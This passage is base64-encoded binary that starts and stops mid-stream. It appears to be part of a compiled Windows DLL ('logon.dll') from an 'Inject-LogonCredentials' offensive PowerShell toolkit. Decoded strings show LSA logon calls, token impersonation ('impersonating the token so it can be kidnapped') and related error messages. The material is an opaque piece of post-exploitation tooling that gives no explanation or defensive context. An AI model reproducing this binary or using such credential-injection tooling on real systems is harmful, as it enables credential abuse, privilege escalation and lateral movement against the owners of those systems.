udGljYXRpb25QYWNrYWdlIGZhaWxlZC4gRXJyb3IgY29kZTogAENhbGwgdG8gT3BlblByb2Nlc3NUb2tlbiBmYWlsZWQuIEVycm9yY29kZTogAAAAAENhbGwgdG8gR2V0VG9rZW5JbmZvcm1hdGlvbiBmYWlsZWQuAEVycm9yIGNhbGxpbmcgTHNhTG9nb25Vc2VyLiBFcnJvciBjb2RlOiAAAAAAAAAAAExvZ29uIHN1Y2NlZWRlZCwgaW1wZXJzb25hdGluZyB0aGUgdG9rZW4gc28gaXQgY2FuIGJlIGtpZG5hcHBlZCBhbmQgc3RhcnRpbmcgYW4gaW5maW5pdGUgbG9vcCB3aXRoIHRoZSB0aHJlYWQuAAAlbHUAJWQAACVsZAAAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwDABEOAZARAHAAAAUlNEU1ehpZ+qaddOugMQvq7frQoKAAAAQzpcR2l0aHViXFBvd2VyU2hlbGxFeHBlcmltZW50YWxcSW5qZWN0LUxvZ29uQ3JlZGVudGlhbHNcTG9nb25Vc2VyXExvZ29uVXNlclxSZWxlYXNlXGxvZ29uLnBkYgAAAAAAAIkAAACJAAAAAAAAABwwARAAAAAAAAAAAP////8AAAAAQAAAALQWARAAAAAAAAAAAAEAAADEFgEQmBYBEAAAAAAAAAAAAAAAAAAAAAAAMAEQ4BYBEAAAAAAAAAAAAgAAAPAWARD8FgEQmBYBEAAAAAAAMAEQAQAAAAAAAAD/////AAAAAEAAAADgFgEQAAAAAAAAAAAAAAAAODABECwXARAAAAAAAAAAAAIAAAA8FwEQSBcBEJgWARAAAAAAODABEAEAAAAAAAAA/////wAAAABAAAAALBcBEAAAAAAAAAAAAAAAAFgwARB4FwEQAAAAAAAAAAADAAAAiBcBEJgXARBIFwEQmBYBEAAAAABYMAEQAgAAAAAAAAD/////AAAAAEAAAAB4FwEQAAAAAAAAAAAAAAAAeDABEMgXARAAAAAAAAAAAAMAAADYFwEQ6BcBEEgXARCYFgEQAAAAAHgwARACAAAAAAAAAP////8AAAAAQAAAAMgXARAAAAAAAAAAAAAAAACgMAEQGBgBEAAAAAAAAAAAAQAAACgYARAwGAEQAAAAAKAwARAAAAAAAAAAAP////8AAAAAQAAAABgYARAAAAAAAAAAAAAAAAAcMAEQtBYBEAAAAAAAAAAAAAAAALAyARB0GAEQAAAAAAAAAAACAAAAhBgBEJAYARCYFgEQAAAAALAyARABAAAAAAAAAP////8AAAAAQAAAAHQYARAAAAAAAAAAAAEAAABsGQEQyD4BEAAAAAAAAAAA/////wAAAABAAAAArBgBEAAAAAAAAAAAAwAAAOgYARB0GQEQDBkBELwYARAAAAAAAAAAAAAAAAAAAAAA7D4BEMAZARDsPgEQAQAAAAAAAAD/////AAAAAEAAAADAGQEQcD4BEAIAAAAAAAAA/////wAAAABAAAAAkBkBEAAAAAAAAAAAAAAAAMg+ARCsGAEQAAAAAAAAAAAAAAAAcD4BEJAZARC8GAEQAAAAAJw+ARACAAAAAAAAAP////8AAAAAQAAAANgYARAAAAAAAAAAAAMAAADQGQEQAAAAAAAAAAAAAAAAnD4BENgYARAMGQEQvBgBEAAAAAAAAAAAAAAAAAIAAAC0GQEQKBkBEAwZARC8GAEQAAAAAMw1AAD9NQAAoEIAAOB5AABwnwAAULMAAHCzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2IgAQAAAAACAaARACAAAALBoBEEgaARAAAAAAADABEAAAAAD/////AAAAAAwAAADKIQAQAAAAABwwARAAAAAA/////wAAAAAMAAAA7zkAEAAAAAA4MAEQAAAAAP////8AAAAADAAAAAAiABAAAAAAQSIAEAAAAACQGgEQAwAAAKAaARBkGgEQSBoBEAAAAABYMAEQAAAAAP////8AAAAADAAAAOUhABAAAAAAQSIAEAAAAADMGgEQAwAAANwaARBkGgEQSBoBEAAAAAB4MAEQAAAAAP////8AAAAADAAAABsiABD+////AAAAANT///8AAAAA/v///wAAAADaKQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAHIsABAAAAAA/v///wAAAADU////AAAAAP7///8KLgAQJC4AEAAAAAD+////AAAAAMT///8AAAAA/v///wAAAAAXQQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAPRHABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAilAAEP7///8AAAAAllAAEP7///8AAAAA2P///wAAAAD+////AAAAAPpRABD+////AAAAAAlSABD+////AAAAAHz///8AAAAA/v///wAAAABnVQAQAAAAAP7///8AAAAA2P///wAAAAD+////BF4AEAheABAAAAAA/v///wAAAADY////AAAAAP7////QXQAQ1F0AEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABlagAQAAAAACpqABA0agAQ/v///wAAAACw////AAAAAP7///8AAAAAW2AAEAAAAACnXwAQsV8AEP7///8AAAAA2P///wAAAAD+////yWcAEM1nABAAAAAA/v///wAAAADY////AAAAAP7///+cXgAQpV4AEEAAAAAAAAAAAAAAAAhhABD/////AAAAAP////8AAAAAAAAAAAAAAAABAAAAAQAAANQcARAiBZMZAgAAAOQcARABAAAA9BwBEAAAAAAAAAAAAAAAAAEAAAAAAAAA/v///wAAAADU////AAAAAP7///9HaQAQS2kAEAAAAADiXgAQAAAAAFwdARACAAAAaB0BEEgaARAAAAAAsDIBEAAAAAD/////AAAAAAwAAADHXgAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAEFtABAAAAAA/v///wAAAADY////AAAAAP7///95bgAQjG4AEAAAAAD+////AAAAALz///8AAAAA/v///wAAAACocAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHt0ABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA/HUAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAADxggAQAAAAAP7///8AAAAAyP///wAAAAD+////AAAAABOMABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAARJwAEAAAAAD+////AAAAAMz///8AAAAA/v///wAAAAB+pQAQAAAAAAAAAABIpQAQ/v///wAAAADQ////AAAAAP7///8AAAAAFacAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAAChpwAQAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAN2vABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAA2bAAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAABmsQAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAD+yABAiBZMZBAAAAJAfARACAAAAsB8BEAAAAAAAAAAAAAAAAAEAAAD/////AAAAAP////8AAAAAAQAAAAAAAAABAAAAAAAAAAIAAAACAAAAAwAAAAEAAADYHwEQAAAAAAAAAAADAAAAAQAAAOgfARBAAAAAAAAAAAAAAADCFgAQQAAAAAAAAAAAAAAAhRYAEGwhAQAAAAAAAAAAAMQhAQAkwQAAXCABAAAAAAAAAAAAPiIBABTAAABIIAEAAAAAAAAAAACoIgEAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeCIBAGQiAQBMIgEAjiIBAAAAAADeIQEA6iEBAP4hAQDQIQEAHiIBACYiAQAyIgEA1CYBAOQmAQD0JgEADiIBAJQkAQC2IgEAxiIBANYiAQDoIgEA/iIBABAjAQAcIwEAMCMBAEwjAQBkIwEAciMBAIgjAQCaIwEAsCMBALwjAQDMIwEA4iMBAO4jAQD6IwEACiQBACIkAQA0JAEAQiQBAGokAQCCJAEACCcBAKokAQDEJAEA2iQBAPQkAQAOJQEAKCUBAD4lAQBaJQEAeCUBAIwlAQCYJQEApiUBALQlAQC+JQEA0iUBAOolAQACJgEAFCYBACYmAQAwJgEAPCYBAEgmAQBWJgEAbCYBAHwmAQCMJgEAnCYBAK4mAQDCJgEAAAAAALQhAQCSIQEAfCEBAAAAAAAmAExzYUNvbm5lY3RVbnRydXN0ZWQALABMc2FMb29rdXBBdXRoZW50aWNhdGlvblBhY2thZ2UAACsATHNhTG9nb25Vc2VyAABTZWN1cjMyLmRsbADWAENyZWF0ZUZpbGVXAFgEUmVhZEZpbGUAACMCR2V0Q3VycmVudFByb2Nlc3MAagJHZXRMYXN0RXJyb3IAAOUAQ3JlYXRlTXV0ZXhXAABfBVNsZWVwAB0GbHN0cmxlblcAAPEFV3JpdGVGaWxlAEtFUk5FTDMyLmRsbAAA0wFMc2FOdFN0YXR1c1RvV2luRXJyb3IAEgJPcGVuUHJvY2Vzc1Rva2VuAABvAUdldFRva2VuSW5mb3JtYXRpb24AiQFJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcgBBRFZBUEkzMi5kbGwAADwBRW5jb2RlUG9pbnRlcgAXAURlY29kZVBvaW50ZXIA4gFHZXRDb21tYW5kTGluZUEAKAJHZXRDdXJyZW50VGhyZWFkSWQAAEgEUmFpc2VFeGNlcHRpb24AALoEUnRsVW53aW5kAIMDSXNEZWJ1Z2dlclByZXNlbnQAiANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AG0DSW50ZXJsb2NrZWREZWNyZW1lbnQAAG0BRXhpdFByb2Nlc3MAgAJHZXRNb2R1bGVIYW5kbGVFeFcAALUCR2V0UHJvY0FkZHJlc3MAAOwDTXVsdGlCeXRlVG9XaWRlQ2hhcgBWA0hlYXBTaXplAADdAkdldFN0ZEhhbmRsZQAAfQJHZXRNb2R1bGVGaWxlTmFtZVcAAFEDSGVhcEZyZWUAAE0DSGVhcEFsbG9jABcFU2V0TGFzdEVycm9yAABxA0ludGVybG9ja2VkSW5jcmVtZW50AAC6AkdldFByb2Nlc3NIZWFwAABXAkdldEZpbGVUeXBlAGYDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudAAeAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgDXAkdldFN0YXJ0dXBJbmZvVwB8AkdldE1vZHVsZUZpbGVOYW1lQQAAPARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAkAkdldEN1cnJlbnRQcm9jZXNzSWQA9AJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBAAkdldEVudmlyb25tZW50U3RyaW5nc1cAALcBRnJlZUVudmlyb25tZW50U3RyaW5nc1cA3QVXaWRlQ2hhclRvTXVsdGlCeXRlAJAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABQBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBvBVRlcm1pbmF0ZVByb2Nlc3MAAIEFVGxzQWxsb2MAAIMFVGxzR2V0VmFsdWUAhAVUbHNTZXRWYWx1ZQCCBVRsc0ZyZWUAgQJHZXRNb2R1bGVIYW5kbGVXAABAAUVudGVyQ3JpdGljYWxTZWN0aW9uAAC9A0xlYXZlQ3JpdGljYWxTZWN0aW9uAADCA0xvYWRMaWJyYXJ5RXhXAACNA0lzVmFsaWRDb2RlUGFnZQC+AUdldEFDUAAAoAJ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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQE0BEAAAAABATQEQAQEAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEMAAAAAAAAANAcBEDgHARA8BwEQQAcBEEQHARBIBwEQTAcBEFAHARBYBwEQYAcBEGgHARB0BwEQgAcBEIgHARCUBwEQmAcBEJwHARCgBwEQpAcBEKgHARCsBwEQsAcBELQHARC4BwEQvAcBEMAHARDEBwEQzAcBENgHARDgBwEQpAc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+PUM9rz26PcA95z0sPjI+Nz4/Ptc+5D71PhU/AAAAYAAAeAAAAOMwITNDNU01WDWvNUs32TesORU8JTxCPEg8UjxoPHs8kTyaPKY8sTzWPAk9GD0fPU09Uj1qPXM9iD2OPfY9+z0NPis+Pz5FPuY+7D7yPgc/Dz8VPyE/Jj8rPzA/OT+EP4k/yD/NP9Y/2z/kP+k/9j8AcAAA5AAAAFMwXTB6MIQw8zApMToxZDFrMXIxeTGUMaAxqjG3McEx0TEkMl4yeTLlM/czMTQ+NEg0VjRfNGk0ijQFNRU1KzU+NVg1YDVrNYI1nDW3NcA1xjXPNdQ14zXqNRE2PDZ2Nqw2vzZZN4w3szf+N2M4aTh1OKw4xDgQORY5IjllOXE5fDpXPF88ZDyIPJc8ujzLPNE83TzrPPE8AD0HPRc9HT0jPSs9MT03PT89RT1LPVM9XD1jPWs9dD2GPZ49pD2tPbM9vT3IPQs+Iz48Pp0+xj7vPv0+Az8/P9Q/9z8AgAAAkAAAAFEwazB6MIcwkzCjMLIwuTDKMNgw4zDrMPgwAjEoMVkxZjFvMZMxwDEIMhkyQTJ0Mo4yqjIuM6EzGTRLNFo0eDTSNJU1vjXHNRo2Izb6NgY3MTfuN/c36TjyON45KDoxOlk6rDrAOgc7TTuJO6Y7xTt/PIk8oTy8PAc9kD2tPdk9TT5lPpU+AAAAkAAAUAAAAMIxrzIjNCk0TzRVNHQ0ejQVNkU4SThNOFE4VThZOF04YThWOZ059TmvOuI6TDuPO9c76TsiPIQ85DzvPM096T1cP8E/zT8AAACgAACMAAAARTBfMGgwpTAKMX4xYDLRMg4zhTOXM6w00jTdNP80UjWHNqg2rzbWNuM26Db2NiQ3QDdnN4g3lDe7N8s35DcGOA04WThqOK44ujhSOYg50DnfOf45TzphOnM6hTqXOqk6uzrNOt868ToDOxU7JztGO1g7ajt8O447IT9MP2k/iT+eP6g/ALAAAEgAAABzMOgw+TANMRMxGDEgMSoxMDFEMVAxpzHWMewxCDKDMsAyyjLmMjozQDNiM4IzkTOhM7EzwjPGM9Iz1jPiM+YzAMAAAKgBAAA4MTwxQDFMMVAxVDFYMWQxaDFsMbwxxDHMMdQx3DHkMewx9DH8MQQyDDIUMhwyJDIsMjQyPDJEMkwyVDJcMmQybDJ0MnwyhDKMMpQynDKkMqwytDK8MsQyzDLUMtwy5DLsMvQy/DIEMwwzFDMcMyQzLDM0MzwzRDNMM1QzXDNkM2wzdDN8M4QzjDOUM5wzpDOsM7QzvDPEM8wz1DPcM+Qz7DP0M/wzBDQUNBw0JDQsNDQ0PDRENEw0VDRcNGQ0bDR0NHw0hDSMNJQ0nDSkNKw0tDS8NMQ0zDTUNNw05DTsNPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pD